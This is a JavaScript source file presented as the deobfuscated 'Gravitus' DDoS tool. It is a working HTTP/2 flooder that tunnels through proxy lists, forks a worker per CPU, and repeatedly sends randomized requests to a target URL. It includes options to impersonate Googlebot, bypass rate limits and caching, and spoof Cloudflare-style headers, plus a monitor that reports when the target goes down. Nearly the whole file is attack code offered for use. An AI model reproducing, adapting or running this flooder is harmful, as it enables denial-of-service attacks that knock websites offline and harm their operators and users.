// Deobfuscated version of Gravitus DDoS Tool

const os = require('os');
const path = require("path");
const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const fs = require('fs');
const axios = require("axios");

// Color codes for console output
const colors = {
    reset: "\x1b[0m",
    bright: "\x1b[1m",
    dim: "\x1b[2m",
    underscore: "\x1b[4m",
    blink: "\x1b[5m",
    reverse: "\x1b[7m",
    black: "\x1b[30m",
    red: "\x1b[31m",
    green: "\x1b[32m",
    yellow: "\x1b[33m",
    blue: "\x1b[34m",
    magenta: "\x1b[35m",
    cyan: "\x1b[36m",
    white: "\x1b[37m",
    brightMagenta: "\x1b[1;35m",
    brightCyan: "\x1b[1;36m"
};

// Parse command line arguments
const args = {
    'target': process.argv[2],
    'time': parseInt(process.argv[3]),
    'Rate': parseInt(process.argv[4]) || 1,
    'threads': parseInt(process.argv[5]) || os.cpus().length,
    'proxyFile': process.argv[6]
};

const filename = path.basename(__filename);
const currentTime = new Date();
const httpTime = currentTime.toUTCString();
const timestamp = Date.now();

// Anti-debugging/interference code removed

const timestampString = timestamp.toString().substring(0, 10);

// Ignore unhandled exceptions and rejections
process.on("uncaughtException", () => {});
process.on("unhandledRejection", () => {});

function showBanner() {
    console.clear();
    console.log(colors.cyan + `
   ▄██████▄     ▄████████    ▄████████  ▄█    █▄   ▄█      ███     ███    █▄     ▄████████          
  ███    ███   ███    ███   ███    ███ ███    ███ ███  ▀█████████▄ ███    ███   ███    ███          
  ███    █▀    ███    ███   ███    ███ ███    ███ ███▌    ▀███▀▀██ ███    ███   ███    █▀           
 ▄███         ▄███▄▄▄▄██▀   ███    ███ ███    ███ ███▌     ███   ▀ ███    ███   ███                 
▀▀███ ████▄  ▀▀███▀▀▀▀▀   ▀███████████ ███    ███ ███▌     ███     ███    ███ ▀███████████          
  ███    ███ ▀███████████   ███    ███ ███    ███ ███      ███     ███    ███          ███          
  ███    ███   ███    ███   ███    ███ ███    ███ ███      ███     ███    ███    ▄█    ███          
  ████████▀    ███    ███   ███    █▀   ▀██████▀  █▀      ▄████▀   ████████▀   ▄████████▀         
               ███    ███                                                                       
` + colors.reset);
    console.log(colors.bright + colors.white + " Gravitus - Premium DDoS Tool v1" + colors.reset);
    console.log(colors.dim + "════════════════════════════════════════════════════════════" + colors.reset);
    console.log(colors.yellow + "Developed by Gravitus and m85 | Discord: https://discord.gg/S7Cp94S7nU" + colors.reset);
    console.log(colors.dim + "════════════════════════════════════════════════════════════" + colors.reset);
    console.log(colors.dim + "════════════════════════════════════════════════════════════" + colors.reset);
    console.log(colors.blue + "Tweaks:" + colors.reset);
    console.log(colors.blue + "  --bfm Emulate Googlebot to bypass bot protection [" + (process.argv.includes("--bfm") ? colors.green + "ACTIVE" : colors.red + "INACTIVE") + colors.blue + "]" + colors.reset);
    console.log(colors.blue + "  --ratelimit Add random query strings to bypass rate limits [" + (process.argv.includes("--ratelimit") ? colors.green + "ACTIVE" : colors.red + "INACTIVE") + colors.blue + "]" + colors.reset);
    console.log(colors.blue + "  --spoof Spoof Cloudflare headers for enhanced bypass [" + (process.argv.includes("--spoof") ? colors.green + "ACTIVE" : colors.red + "INACTIVE") + colors.blue + "]" + colors.reset);
    console.log(colors.blue + "  --origin Use random origin headers to mimic traffic [" + (process.argv.includes("--origin") ? colors.green + "ACTIVE" : colors.red + "INACTIVE") + colors.blue + "]" + colors.reset);
    console.log(colors.blue + "  --cache Bypass caching with dynamic cache headers [" + (process.argv.includes("--cache") ? colors.green + "ACTIVE" : colors.red + "INACTIVE") + colors.blue + "]" + colors.reset);
    console.log(colors.dim + "════════════════════════════════════════════════════════════" + colors.reset);
}

// Check command line arguments
if (process.argv.length < 7) {
    showBanner();
    console.log("Usage: node " + filename + " <target> <time> <rate> <threads> <proxyfile>");
    process.exit(1);
}

const parsedUrl = url.parse(args.target);

// Helper functions
function readLines(filename) {
    return fs.readFileSync(filename, "utf-8").toString().split(/\r?\n/);
}

function randomInt(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(array) {
    return array[randomInt(0, array.length)];
}

function randstr(length) {
    let result = '';
    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    for (let i = 0; i < length; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
}

function generateRandomString(min, max) {
    const length = Math.floor(Math.random() * (max - min) + min);
    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    const result = Array.from({ length }, () => chars.charAt(Math.floor(Math.random() * chars.length)));
    return result.join('');
}

// User agents lists
const userAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    // ... (truncated for brevity, full list in original)
];

const googleBotAgents = [
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.90 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Googlebot/2.1 (+http://www.google.com/bot.html)"
];

const accept_header = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
    // ... (truncated)
];

const language_header = ["ko-KR", "en-US", "zh-CN", "zh-TW", "ja-JP", "en-GB", "en-AU"];
const encoding_header = ["gzip, deflate, br", "gzip, deflate, br, zstd", "compress, gzip"];
const control_header = ["max-age=604800", "proxy-revalidate", "public, max-age=0"];

const cplist = [
    "ECDHE-RSA-AES128-GCM-SHA256",
    "ECDHE-RSA-AES128-SHA256",
    "ECDHE-RSA-AES128-SHA",
    "ECDHE-RSA-AES256-GCM-SHA384",
    "ECDHE-RSA-AES256-SHA",
    "TLS_AES_128_GCM_SHA256",
    "TLS_CHACHA20_POLY1305_SHA256"
];

const country_codes = ['A1', 'AD', 'AE', 'AF', 'AG', 'AI', 'AL', 'AM', 'AO'];
const referer_hosts = ["google.com", "youtube.com", "facebook.com", "baidu.com", "wikipedia.org"];

// Network socket class
class NetSocket {
    constructor() {}

    async HTTP(proxyInfo, callback) {
        const connectString = "CONNECT " + proxyInfo.address + ":443 HTTP/1.1\r\nHost: " + proxyInfo.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
        const buffer = Buffer.from(connectString);
        
        const socket = await net.connect({
            host: proxyInfo.host,
            port: proxyInfo.port
        });

        socket.setTimeout(proxyInfo.timeout * 600000);
        socket.setKeepAlive(true, 100000);

        socket.on("connect", () => {
            socket.write(buffer);
        });

        socket.on("data", (data) => {
            const response = data.toString("utf-8");
            const success = response.includes("HTTP/1.1 200");
            if (!success) {
                socket.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(socket, undefined);
        });

        socket.on("timeout", () => {
            socket.destroy();
            return callback(undefined, "error: timeout exceeded");
        });

        socket.on("error", () => {
            socket.destroy();
            return callback(undefined, "error: connection error");
        });
    }
}

const Socker = new NetSocket();

// Browser version and platform setup
const version = randomInt(126, 134);
let brandValue;
let fullVersion;

switch (version) {
    case 126:
        brandValue = "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"" + version + "\", \"Google Chrome\";v=\"" + version + "\"";
        fullVersion = version + ".0." + randomInt(6610, 6790) + '.' + randomInt(10, 100);
        break;
    case 127:
        brandValue = "\"Not;A=Brand\";v=\"24\", \"Chromium\";v=\"" + version + "\", \"Google Chrome\";v=\"" + version + "\"";
        fullVersion = version + ".0." + randomInt(6610, 6790) + '.' + randomInt(10, 100);
        break;
    // ... other versions
    default:
        brandValue = "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"" + version + "\", \"Google Chrome\";v=\"" + version + "\"";
        fullVersion = version + ".0." + randomInt(6610, 6790) + '.' + randomInt(10, 100);
}

const platforms = ["Windows", "Macintosh", "Linux", "Android", "PlayStation 4"];
const platform = platforms[randomInt(0, platforms.length)];

let secChUaPlatform;
let platformVersion;

switch (platform) {
    case "Windows":
        secChUaPlatform = "\"Windows\"";
        platformVersion = "\"10.0.0\"";
        break;
    case "Linux":
        secChUaPlatform = "\"Linux\"";
        platformVersion = "\"5.15.0\"";
        break;
    default:
        secChUaPlatform = "\"Windows\"";
        platformVersion = "\"10.0.0\"";
}

// Target monitoring function
async function monitorTarget() {
    try {
        const response = await axios.get(args.target, {
            'timeout': 3000,
            'validateStatus': () => true,
            'headers': {
                'User-Agent': process.argv.includes("--bfm") ? 
                    googleBotAgents[randomInt(0, googleBotAgents.length)] : 
                    userAgents[randomInt(0, userAgents.length)]
            }
        });

        if (response.status === 200) {
            const titleMatch = response.data.match(/<title>(.*?)<\/title>/i);
            const title = titleMatch ? titleMatch[1].substring(0, 50) : "No title";
            console.log(colors.green + "[GRAVITUS] OK (200) | Title: \"" + title + "\"" + colors.reset);
        } else {
            if (response.status >= 500) {
                console.log(colors.yellow + "[GRAVITUS] Status " + response.status + " | HEHE Server Error" + colors.reset);
            } else {
                console.log(colors.yellow + "[GRAVITUS] Status " + response.status + " | Responding" + colors.reset);
            }
        }
    } catch (error) {
        if (error.code === "ECONNABORTED" || error.code === "ETIMEDOUT") {
            console.log(colors.red + "[GRAVITUS] Timeout | HEHE" + colors.reset);
        } else if (error.code === "ENETUNREACH") {
            console.log(colors.red + "[GRAVITUS] No Connection" + colors.reset);
        } else if (error.response && error.response.status >= 500) {
            console.log(colors.magenta + "[GRAVITUS] Error: " + error.response.status + " | HEHE Server Error" + colors.reset);
        } else if (error.response) {
            console.log(colors.magenta + "[GRAVITUS] Error: " + error.response.status + " | Responding" + colors.reset);
        }
    }
}

// Main flooder function
function runFlooder() {
    const proxies = fs.readFileSync(args.proxyFile, "utf-8").toString().split(/\r?\n/);
    const randomProxy = proxies[randomInt(0, proxies.length)];
    const proxyParts = randomProxy.split(':');
    
    const proxyInfo = {
        'host': proxyParts[0],
        'port': parseInt(proxyParts[1]),
        'address': parsedUrl.host + ":443",
        'timeout': 100
    };

    let path = parsedUrl.path;
    if (process.argv.includes("--ratelimit")) {
        path += "?robots.txt=" + randstr(30) + '_' + randstr(12) + '-' + timestampString + "-0-gaNy" + randstr(8);
    } else {
        path += "?cachebuster=" + randstr(16);
    }

    let userAgent = userAgents[randomInt(0, userAgents.length)];
    if (process.argv.includes("--bfm")) {
        userAgent = googleBotAgents[randomInt(0, googleBotAgents.length)];
    }

    let referer = parsedUrl.host;
    if (process.argv.includes("--origin")) {
        referer = "https://www." + referer_hosts[randomInt(0, referer_hosts.length)] + '/' + generateRandomString(5, 15);
    }

    let cacheHeaders = {};
    if (process.argv.includes("--cache")) {
        cacheHeaders = {
            'Cache-Control': "max-age=0",
            'X-Cache': Math.random() > 0.5 ? "HIT" : "MISS"
        };
    } else {
        cacheHeaders = {
            "Cache-Control": "no-store, no-cache, must-revalidate"
        };
    }

    let spoofHeaders = {};
    if (process.argv.includes("--spoof")) {
        spoofHeaders = {
            'If-Modified-Since': httpTime,
            'If-None-Match': "\"" + randstr(20) + '+' + randstr(6) + "=\"",
            'X-Country-Code': country_codes[randomInt(0, country_codes.length)],
            'X-Forwarded-Proto': "https",
            'x-client-session': "true",
            'x-real-ip': proxyParts[0]
        };
    }

    const headers = {
        ':method': "GET",
        ':authority': parsedUrl.host,
        ':path': path,
        ':scheme': "https",
        'accept': accept_header[randomInt(0, accept_header.length)],
        'accept-language': language_header[randomInt(0, language_header.length)],
        'accept-encoding': encoding_header[randomInt(0, encoding_header.length)],
        'sec-fetch-site': "document",
        'sec-fetch-mode': "navigate",
        'sec-fetch-dest': "document",
        'sec-fetch-user': '?1',
        'user-agent': userAgent,
        'sec-ch-ua': brandValue,
        'sec-ch-ua-platform': secChUaPlatform,
        'sec-ch-ua-mobile': '?0',
        'upgrade-insecure-requests': '1',
        'referer': referer,
        'cookie': "session=" + randstr(12),
        'DNT': '1',
        'Max-Forwards': '0',
        'Accept-Ch': "DPR, Width, Viewport-Width, Downlink, Save-data",
        'cache-control': "no-cache, must-revalidate, max-age=0",
        'pragma': "no-cache",
        'X-Bypass-Cache': "true",
        ...cacheHeaders,
        ...spoofHeaders
    };

    Socker.HTTP(proxyInfo, async (socket, error) => {
        if (error) {
            return;
        }

        socket.setKeepAlive(true, 600000);
        
        const tlsOptions = {
            'rejectUnauthorized': false,
            'host': parsedUrl.host,
            'servername': parsedUrl.host,
            'socket': socket,
            'ecdhCurve': "prime256v1:secp384r1",
            'ciphers': cplist[randomInt(0, cplist.length)],
            'secureProtocol': "TLS_method",
            'ALPNProtocols': ["http/1.1", 'h2']
        };

        const tlsSocket = await tls.connect(443, parsedUrl.host, tlsOptions);
        tlsSocket.setKeepAlive(true, 60000);

        const client = await http2.connect(parsedUrl.href, {
            'protocol': "https:",
            'settings': {
                'headerTableSize': 65536,
                'maxConcurrentStreams': 1000,
                'initialWindowSize': Math.random() < 0.5 ? 6291456 : 2097152,
                'maxHeaderListSize': 262144,
                'enablePush': false
            },
            'maxSessionMemory': 3333,
            'maxDeflateDynamicTableSize': 4294967295,
            'createConnection': () => tlsSocket,
            'socket': socket
        });

        client.settings({
            'headerTableSize': 65536,
            'maxConcurrentStreams': 1000,
            'initialWindowSize': Math.random() < 0.5 ? 6291456 : 2097152,
            'maxHeaderListSize': 262144,
            'enablePush': false
        });

        client.on("connect", () => {
            const interval = setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    const requestHeaders = {
                        ...headers,
                        'user-agent': process.argv.includes("--bfm") ? 
                            googleBotAgents[randomInt(0, googleBotAgents.length)] : 
                            userAgents[randomInt(0, userAgents.length)],
                        'accept': accept_header[randomInt(0, accept_header.length)],
                        'accept-language': language_header[randomInt(0, language_header.length)],
                        'accept-encoding': encoding_header[randomInt(0, encoding_header.length)],
                        'cache-control': control_header[randomInt(0, control_header.length)],
                        ':path': process.argv.includes("--ratelimit") ? 
                            parsedUrl.path + "?robots.txt=" + randstr(30) + '_' + randstr(12) + '-' + timestampString + "-0-gaNy" + randstr(8) : 
                            parsedUrl.path + "?cachebuster=" + randstr(16),
                        'cookie': "session=" + randstr(12)
                    };

                    const req = client.request(requestHeaders);
                    req.on("response", () => {
                        req.close();
                        req.destroy();
                    });
                    req.on("error", () => {
                        req.destroy();
                    });
                    req.end();
                }
            }, 700);

            client.on("close", () => {
                clearInterval(interval);
                client.destroy();
                tlsSocket.destroy();
                socket.destroy();
                runFlooder();
            });

            client.on("error", () => {
                clearInterval(interval);
                client.destroy();
                tlsSocket.destroy();
                socket.destroy();
                runFlooder();
            });
        });
    });
}

// Main execution
if (cluster.isMaster) {
    showBanner();
    console.log(colors.cyan + "┌───────────────── System Information ────────────────┐" + colors.reset);
    console.log(colors.cyan + "│ " + colors.bright + "Target: " + colors.white + args.target.padEnd(35) + colors.cyan + " │" + colors.reset);
    console.log(colors.cyan + "│ " + colors.bright + "Duration: " + colors.white + args.time + " seconds" + " ".repeat(25 - args.time.toString().length) + colors.cyan + " │" + colors.reset);
    console.log(colors.cyan + "│ " + colors.bright + "Rate: " + colors.white + args.Rate + " req/700ms" + " ".repeat(26 - args.Rate.toString().length) + colors.cyan + " │" + colors.reset);
    console.log(colors.cyan + "│ " + colors.bright + "Threads: " + colors.white + args.threads + " ".repeat(33 - args.threads.toString().length) + colors.cyan + " │" + colors.reset);
    console.log(colors.cyan + "│ " + colors.bright + "Proxy File: " + colors.white + args.proxyFile.padEnd(31) + colors.cyan + " │" + colors.reset);
    console.log(colors.cyan + "└─────────────────────────────────────────────────────┘" + colors.reset);

    const monitor = setInterval(monitorTarget, 2000);
    monitorTarget();

    const restartScript = () => {
        for (const workerId in cluster.workers) {
            cluster.workers[workerId].kill();
        }
        console.log(colors.yellow + "[>] Restarting in 1000 ms..." + colors.reset);
        setTimeout(() => {
            for (let i = 1; i <= args.threads; i++) {
                cluster.fork();
            }
        }, 1000);
    };

    const handleRAMUsage = () => {
        const totalMem = os.totalmem();
        const usedMem = totalMem - os.freemem();
        const usagePercent = usedMem / totalMem * 100;
        if (usagePercent >= 90) {
            console.log(colors.yellow + "[!] RAM Usage: " + usagePercent.toFixed(2) + '%' + colors.reset);
            restartScript();
        }
    };

    setInterval(handleRAMUsage, 5000);

    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }

    setTimeout(() => {
        clearInterval(monitor);
        console.log(colors.green + "[✓] Attack Completed!" + colors.reset);
        process.exit(0);
    }, args.time * 1000);
} else {
    setInterval(runFlooder);
}
